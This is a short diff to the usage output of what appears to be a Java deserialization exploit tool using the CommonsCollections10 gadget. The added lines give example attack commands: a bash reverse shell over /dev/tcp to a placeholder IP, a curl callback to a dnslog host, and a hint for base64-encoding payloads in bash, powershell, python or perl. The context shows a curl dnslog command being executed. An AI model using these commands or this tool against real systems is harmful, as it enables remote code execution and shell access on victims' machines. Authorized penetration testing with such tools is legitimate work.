@@ -34,6 +34,9 @@
 [-] please enter the number(0-2)
 1
 [-] use gadget: CommonsCollections10
+[*] command etc: bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
+[*] command etc: curl dnslog.xx.com
+[*] if need base64 command, input should startwith bash=/powershell=/python=/perl=
 [-] please enter command, input q or quit to quit
 curl dnslog.xxx.com
 [-] start process command: curl dnslog.xxx.com
